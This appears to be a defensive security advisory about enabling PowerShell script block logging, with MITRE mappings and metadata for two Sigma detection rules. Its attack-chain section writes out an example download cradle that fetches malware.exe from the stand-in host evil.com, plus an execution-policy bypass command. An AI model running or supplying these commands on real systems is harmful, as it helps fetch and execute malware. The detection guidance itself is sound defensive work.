---
title: Enhancing Detection Capabilities Through PowerShell Script Logging
slug: 2024-01-29-powershell-script-logging
description: This brief highlights the importance of PowerShell and script logging to improve threat detection capabilities within an organization's environment, focusing on increased visibility into malicious activities.
date: "2024-01-29T12:00:00Z"
type: advisory
types:
  - advisory
severities:
  - medium
tags:
  - powershell
  - script-logging
  - threat-detection
vendors:
  - Microsoft
products:
  - PowerShell
mitre_ttps:
  - tactic_id: TA0001
    tactic_name: Initial Access
    technique_id: T1190
    technique_name: Exploit Public-Facing Application
  - tactic_id: TA0005
    tactic_name: Defense Evasion
    technique_id: T1562
    technique_name: Impair Defenses
  - tactic_id: TA0007
    tactic_name: Discovery
    technique_id: T1018
    technique_name: Remote System Discovery
  - tactic_id: TA0008
    tactic_name: Lateral Movement
    technique_id: T1021
    technique_name: Remote Services
  - tactic_id: TA0003
    tactic_name: Persistence
    technique_id: T1053
    technique_name: Scheduled Task/Job
  - tactic_id: TA0010
    tactic_name: Exfiltration
    technique_id: T1041
    technique_name: Exfiltration Over C2 Channel
references:
  - https://trustedsec.com/blog/building-a-detection-foundation-part-3-powershell-and-script-logging
  - https://www.reddit.com/r/blueteamsec/comments/1ruh494/building_a_detection_foundation_part_3_powershell/
rules:
  - title: Detect PowerShell Web Download Cradle
    description: Detects PowerShell scripts that download files from the internet using `System.Net.WebClient`.
    platform: sigma
    severity: high
    tactics:
      - initial_access
    techniques:
      - T1190
    data_sources:
      - process_creation
      - windows
  - title: Detect PowerShell Execution Policy Bypass
    description: Detects PowerShell commands that bypass the execution policy, which is often used by attackers to run unsigned scripts.
    platform: sigma
    severity: medium
    tactics:
      - defense_evasion
    techniques:
      - T1562.001
    data_sources:
      - process_creation
      - windows
rules_count: 2
---

PowerShell is a powerful scripting language that is frequently abused by threat actors for various malicious purposes, including initial access, lateral movement, and persistence. Enabling and monitoring PowerShell script logging is critical for defenders to gain better visibility into attacker activities. The increased logging provides detailed insights into the commands executed within the PowerShell environment, allowing security teams to identify and respond to suspicious behavior more effectively. This brief focuses on the importance of script logging and provides guidance on how to implement detections based on the collected logs.

## Attack Chain

1.  An attacker gains initial access to a system, possibly through exploiting a vulnerability or utilizing stolen credentials.
2.  The attacker executes a PowerShell script to download a malicious payload from a remote server using `powershell.exe -exec bypass -c (New-Object System.Net.WebClient).DownloadFile('http://evil.com/malware.exe', 'C:\Windows\Temp\malware.exe')`.
3.  The attacker uses PowerShell to bypass execution policy restrictions, allowing unsigned scripts to run, using `Set-ExecutionPolicy Bypass -Scope Process`.
4.  The attacker leverages PowerShell to perform reconnaissance, gathering information about the compromised system and network using commands such as `Get-NetIPConfiguration` and `Get-ADDomain`.
5.  The attacker uses PowerShell to move laterally to other systems on the network by using the `Invoke-Command` cmdlet.
6.  The attacker employs PowerShell to establish persistence by creating a scheduled task that executes a malicious script at regular intervals using `Register-ScheduledTask`.
7.  The attacker utilizes PowerShell to exfiltrate sensitive data from the compromised network to an external server via Base64 encoding and web requests.

## Impact

Compromised systems can lead to data breaches, financial losses, and reputational damage. Without proper logging and monitoring of PowerShell activity, organizations may remain unaware of malicious actions, leading to prolonged compromise and greater impact. PowerShell-based attacks can bypass traditional security controls, making them especially dangerous. Enabling comprehensive logging is essential to mitigating this risk.

## Recommendation

*   Enable PowerShell script block logging to capture the contents of executed scripts (reference: Overview section).
*   Deploy the Sigma rules in this brief to your SIEM to detect suspicious PowerShell activity (reference: rules section).
*   Monitor for PowerShell processes spawning from unusual parent processes (e.g., Microsoft Word) as an indicator of potential exploitation (reference: Attack Chain Step 2).
*   Create alerts for PowerShell commands that bypass execution policies, download files from the internet, or attempt to exfiltrate data (reference: Attack Chain steps 2, 3, and 7).
